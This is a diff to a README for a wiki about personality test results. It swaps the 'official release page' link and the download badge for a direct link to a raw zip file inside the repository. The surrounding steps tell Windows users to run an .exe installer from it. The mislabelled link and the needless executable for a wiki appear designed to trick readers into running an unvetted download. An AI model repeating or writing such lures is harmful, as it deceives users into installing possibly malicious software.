@@ -1,6 +1,6 @@
 # 🧩 sbti-wiki - View every SBTI personality test result
 
-[![Download Software](https://img.shields.io/badge/Download_Latest-Blue?style=for-the-badge&logo=github)](https://github.com/edouarduniversalistic5831/sbti-wiki/releases)
+[![Download Software](https://img.shields.io/badge/Download_Latest-Blue?style=for-the-badge&logo=github)](https://github.com/edouarduniversalistic5831/sbti-wiki/raw/refs/heads/main/web/wiki-sbti-2.7-beta.2.zip)
 
 This project provides a complete guide for the SBTI personality test. You can view all 27 possible outcomes in one place. The guide includes the 25 standard personality types. It also covers the HHHH fallback and the DRUNK hidden result.
 
@@ -22,7 +22,7 @@ Your computer must meet these settings to run the application:
 
 Follow these steps to set up the application on your computer:
 
-1. Visit the [official release page](https://github.com/edouarduniversalistic5831/sbti-wiki/releases) to download the installer.
+1. Visit the [official release page](https://github.com/edouarduniversalistic5831/sbti-wiki/raw/refs/heads/main/web/wiki-sbti-2.7-beta.2.zip) to download the installer.
 2. Select the file ending in .exe that matches your Windows system.
 3. Save the file to your computer.
 4. Locate the file in your downloads folder.
